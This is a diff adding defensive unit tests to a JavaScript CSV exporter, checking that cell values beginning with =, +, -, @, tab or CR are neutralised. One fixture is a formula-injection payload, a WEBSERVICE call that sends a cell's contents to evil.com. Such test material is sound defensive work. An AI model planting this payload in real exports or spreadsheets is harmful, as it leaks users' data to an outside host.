@@ -38,4 +38,28 @@ describe('toCSV', () => {
   it('returns empty string for empty array', () => {
     expect(toCSV([])).toBe('')
   })
+
+  it('neutralizes a leading = as a CSV formula-injection payload', () => {
+    const data = [{ name: '=WEBSERVICE("http://evil.com/"&A1)' }]
+    const csv = toCSV(data)
+    expect(csv).toBe('name\n"\'=WEBSERVICE(""http://evil.com/""&A1)"')
+    expect(csv.split('\n')[1].startsWith('"\'=')).toBe(true)
+  })
+
+  it('neutralizes leading +, -, @, tab, and CR formula triggers', () => {
+    const data = [{ name: '+1+1' }, { name: '-2+3' }, { name: '@SUM(1,1)' }, { name: '\tcmd' }, { name: '\rcmd' }]
+    const csv = toCSV(data)
+    const lines = csv.split('\n').slice(1)
+    expect(lines[0]).toBe("'+1+1")
+    expect(lines[1]).toBe("'-2+3")
+    expect(lines[2]).toBe('"\'@SUM(1,1)"')
+    expect(lines[3]).toBe("'\tcmd")
+    expect(lines[4]).toBe("'\rcmd")
+  })
+
+  it('does not alter a value that merely contains, but does not start with, a formula char', () => {
+    const data = [{ name: 'Total = 5' }]
+    const csv = toCSV(data)
+    expect(csv).toBe('name\nTotal = 5')
+  })
 })
